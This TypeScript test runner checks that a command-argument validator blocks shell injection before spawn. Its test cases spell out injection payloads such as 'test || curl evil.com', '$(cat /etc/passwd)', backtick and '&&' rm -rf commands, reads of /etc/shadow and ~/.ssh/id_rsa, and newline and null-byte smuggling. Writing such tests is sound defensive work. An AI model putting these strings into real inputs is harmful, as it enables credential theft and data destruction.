#!/usr/bin/env tsx
/**
 * Test runner to prove injection attempts are blocked
 * All malicious inputs should be rejected by the validator BEFORE spawn
 */

import { spawn } from 'child_process';

// Copy of the validator from verifyAllScenarios.ts
function validateExtraArgs(args: string[], scenarioId: string): { valid: boolean; error?: string } {
  // Special handling for exec scenarios that need code snippets
  if (scenarioId === 'tsx-exec' || scenarioId === 'node-exec') {
    if (args.length !== 1) {
      return { valid: false, error: 'Exec scenarios must have exactly one code argument' };
    }
    if (args[0].length > 5000) {
      return { valid: false, error: 'Code argument exceeds 5000 character limit' };
    }
    return { valid: true };
  }
  
  // For non-exec scenarios, strict validation
  const MAX_ARGS = 6;
  const MAX_ARG_LENGTH = 200;
  const MAX_TOTAL_LENGTH = 500;
  
  if (args.length > MAX_ARGS) {
    return { valid: false, error: `Too many arguments (${args.length} > ${MAX_ARGS})` };
  }
  
  const totalLength = args.join(' ').length;
  if (totalLength > MAX_TOTAL_LENGTH) {
    return { valid: false, error: `Total arguments too long (${totalLength} > ${MAX_TOTAL_LENGTH})` };
  }
  
  // Forbidden metacharacters that could be used for injection
  const FORBIDDEN_CHARS = [
    ';', '|', '&', '>', '<', '$', '`', "'", '"',
    '(', ')', '{', '}', '[', ']', '*', '?', '~',
    '\n', '\r', '\t', '\\'
  ];
  
  // Valid flag patterns - no parent directory traversal allowed
  const FLAG_PATTERN = /^--[a-zA-Z0-9-]+(=[a-zA-Z0-9_\-\/]+)?$/;  // No dots in values
  const SHORT_FLAG_PATTERN = /^-[a-zA-Z0-9]$/;
  const FILE_PATH_PATTERN = /^[a-zA-Z0-9_\-\/]+\.(ts|js|json|mjs|cjs)?$/;  // Only forward paths with extensions
  
  for (const arg of args) {
    if (arg.length > MAX_ARG_LENGTH) {
      return { valid: false, error: `Argument too long: "${arg.substring(0, 50)}..."` };
    }
    
    // Check for path traversal attempts
    if (arg.includes('../') || arg.includes('..\\')) {
      return { valid: false, error: `Path traversal attempt blocked: "${arg}"` };
    }
    
    // Check for double slashes (obfuscation attempt)
    if (arg.includes('//') || arg.includes('\\\\')) {
      return { valid: false, error: `Double slash obfuscation blocked: "${arg}"` };
    }
    
    for (const char of FORBIDDEN_CHARS) {
      if (arg.includes(char)) {
        return { valid: false, error: `Forbidden character '${char}' in argument: "${arg}"` };
      }
    }
    
    const isValidFlag = FLAG_PATTERN.test(arg) || SHORT_FLAG_PATTERN.test(arg) || FILE_PATH_PATTERN.test(arg);
    if (!isValidFlag) {
      return { valid: false, error: `Invalid argument format: "${arg}"` };
    }
  }
  
  return { valid: true };
}

// Allowed commands mapping
const ALLOWED_COMMANDS: Record<string, { cmd: string; baseArgs: string[] }> = {
  "tsx-exec": { cmd: "tsx", baseArgs: ["-e"] },
  "node-exec": { cmd: "node", baseArgs: ["-e"] },
  "node-file": { cmd: "node", baseArgs: [] },
  "tsc": { cmd: "npx", baseArgs: ["tsc", "--noEmit"] },
  "lint": { cmd: "npx", baseArgs: ["eslint", "--max-warnings=0"] },
  "route-check": { cmd: "node", baseArgs: ["scripts/verify-routes-used.js"] },
};

console.log('🚫 Injection Prevention Test Runner\n');
console.log('=' .repeat(70));
console.log('Testing that all injection attempts are BLOCKED before spawning\n');

interface InjectionTest {
  name: string;
  scenarioId: string;
  extraArgs: string[];
  attackType: string;
  description: string;
}

const injectionTests: InjectionTest[] = [
  // Command injection via semicolon
  {
    name: 'Command Injection - Semicolon in tsc',
    scenarioId: 'tsc',
    extraArgs: ['--project=.; echo HACK'],
    attackType: 'COMMAND_INJECTION',
    description: 'Attempts to chain echo command after semicolon'
  },
  {
    name: 'Command Injection - Semicolon in lint',
    scenarioId: 'lint',
    extraArgs: ['--max-warnings=0;whoami'],
    attackType: 'COMMAND_INJECTION',
    description: 'Attempts to execute whoami after semicolon'
  },
  
  // Path traversal attempts
  {
    name: 'Path Traversal - Double slash',
    scenarioId: 'route-check',
    extraArgs: ['--config=../..//bad'],
    attackType: 'PATH_TRAVERSAL',
    description: 'Attempts directory traversal with ../../'
  },
  {
    name: 'Path Traversal - Parent directory',
    scenarioId: 'tsc',
    extraArgs: ['--project=../../../etc/passwd'],
    attackType: 'PATH_TRAVERSAL',
    description: 'Attempts to access system files'
  },
  
  // Command substitution
  {
    name: 'Command Substitution - Dollar parenthesis',
    scenarioId: 'lint',
    extraArgs: ['--config=$(cat /etc/passwd)'],
    attackType: 'COMMAND_SUBSTITUTION',
    description: 'Attempts command substitution with $()'
  },
  {
    name: 'Command Substitution - Backticks',
    scenarioId: 'tsc',
    extraArgs: ['--out=`rm -rf /tmp/test`'],
    attackType: 'COMMAND_SUBSTITUTION',
    description: 'Attempts command execution with backticks'
  },
  
  // Pipe injection
  {
    name: 'Pipe Injection - OR operator',
    scenarioId: 'route-check',
    extraArgs: ['test || curl evil.com'],
    attackType: 'PIPE_INJECTION',
    description: 'Attempts to use OR operator for command execution'
  },
  {
    name: 'Pipe Injection - AND operator',
    scenarioId: 'lint',
    extraArgs: ['--fix && rm -rf node_modules'],
    attackType: 'PIPE_INJECTION',
    description: 'Attempts to chain destructive command with &&'
  },
  {
    name: 'Pipe Injection - Pipe character',
    scenarioId: 'tsc',
    extraArgs: ['--listFiles | grep password'],
    attackType: 'PIPE_INJECTION',
    description: 'Attempts to pipe output to grep'
  },
  
  // Redirection attacks
  {
    name: 'Output Redirection',
    scenarioId: 'lint',
    extraArgs: ['--output=report.txt > /etc/passwd'],
    attackType: 'REDIRECTION',
    description: 'Attempts to redirect output to sensitive file'
  },
  {
    name: 'Input Redirection',
    scenarioId: 'route-check',
    extraArgs: ['< /etc/shadow'],
    attackType: 'REDIRECTION',
    description: 'Attempts to read from sensitive file'
  },
  
  // Quote escaping
  {
    name: 'Quote Escape - Double quotes',
    scenarioId: 'tsc',
    extraArgs: ['--lib="es2020"; ls -la'],
    attackType: 'QUOTE_ESCAPE',
    description: 'Attempts to escape quotes and inject command'
  },
  {
    name: 'Quote Escape - Single quotes',
    scenarioId: 'lint',
    extraArgs: ["--parser='espree'; id"],
    attackType: 'QUOTE_ESCAPE',
    description: 'Attempts command injection via single quotes'
  },
  
  // Environment variable injection
  {
    name: 'Environment Variable',
    scenarioId: 'route-check',
    extraArgs: ['--env=$HOME/.ssh/id_rsa'],
    attackType: 'ENV_INJECTION',
    description: 'Attempts to access sensitive files via env vars'
  },
  
  // Wildcard expansion
  {
    name: 'Wildcard Expansion',
    scenarioId: 'tsc',
    extraArgs: ['--types=*'],
    attackType: 'WILDCARD',
    description: 'Attempts wildcard expansion'
  },
  
  // Newline injection
  {
    name: 'Newline Injection',
    scenarioId: 'lint',
    extraArgs: ['--config=eslint.json\ncat /etc/passwd'],
    attackType: 'NEWLINE',
    description: 'Attempts to inject command via newline'
  },
  
  // Null byte injection
  {
    name: 'Null Byte Injection',
    scenarioId: 'route-check',
    extraArgs: ['--file=test.js\x00.sh'],
    attackType: 'NULL_BYTE',
    description: 'Attempts null byte injection'
  }
];

let blockedCount = 0;
let passedCount = 0;

console.log(`Running ${injectionTests.length} injection tests...\n`);

injectionTests.forEach((test, index) => {
  console.log(`Test ${index + 1}/${injectionTests.length}: ${test.name}`);
  console.log(`  Attack Type: ${test.attackType}`);
  console.log(`  Scenario ID: ${test.scenarioId}`);
  console.log(`  Payload: ${JSON.stringify(test.extraArgs)}`);
  console.log(`  Description: ${test.description}`);
  
  // Check if scenario ID exists
  const allowedCommand = ALLOWED_COMMANDS[test.scenarioId];
  if (!allowedCommand) {
    console.log(`  ❌ Result: BLOCKED - Invalid scenario ID`);
    blockedCount++;
    console.log();
    return;
  }
  
  // Validate arguments
  const validation = validateExtraArgs(test.extraArgs, test.scenarioId);
  
  if (!validation.valid) {
    console.log(`  ✅ Result: BLOCKED - ${validation.error}`);
    console.log(`  🛡️ No process spawned - injection prevented!`);
    blockedCount++;
  } else {
    console.log(`  ❌ SECURITY FAILURE: Validator passed malicious input!`);
    console.log(`  ⚠️ This should never happen - validator needs fixing!`);
    passedCount++;
  }
  console.log();
});

console.log('=' .repeat(70));
console.log('\n📊 Test Results Summary:\n');
console.log(`  Total injection attempts: ${injectionTests.length}`);
console.log(`  Successfully blocked: ${blockedCount}`);
console.log(`  Failed to block: ${passedCount}`);

if (passedCount === 0) {
  console.log('\n✅ SUCCESS: All injection attempts were blocked!');
  console.log('🛡️ The validator successfully prevented all attack vectors:');
  console.log('   • Command injection (;, &&, ||)');
  console.log('   • Command substitution ($(), ``)');
  console.log('   • Path traversal (../)');
  console.log('   • Output/input redirection (>, <)');
  console.log('   • Pipe operations (|)');
  console.log('   • Quote escaping (\', ")');
  console.log('   • Environment variable expansion ($)');
  console.log('   • Wildcard expansion (*)');
  console.log('   • Newline injection (\\n)');
  console.log('\n🔒 No malicious commands were executed!');
} else {
  console.log('\n❌ FAILURE: Some injections were not blocked!');
  console.log('⚠️ The validator needs to be fixed immediately!');
  process.exit(1);
}

console.log('\n' + '=' .repeat(70));
console.log('\n💡 Key Security Principle:');
console.log('All validation happens BEFORE spawn() is called.');
console.log('If validation fails, no child process is ever created.');